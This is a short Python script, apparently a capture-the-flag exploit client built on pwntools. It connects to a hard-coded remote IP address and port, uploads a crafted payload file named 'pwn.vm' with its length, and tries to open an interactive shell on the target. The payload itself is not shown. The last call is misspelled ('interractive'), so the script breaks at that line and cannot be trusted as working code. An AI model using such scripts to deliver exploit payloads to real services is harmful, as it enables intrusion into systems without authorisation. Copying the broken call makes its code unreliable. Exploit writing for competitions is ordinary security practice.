#!/usr/bin/env python3

from pwn import *

# context.log_level = logging.DEBUG

HOST = '198.11.180.84'
PORT = 6666

r = remote(HOST, PORT)

with open('pwn.vm', 'rb') as f:
    data = f.read()
    
r.sendlineafter('(< 4096) : ', str(len(data)))
r.sendline(data)

r.interractive()

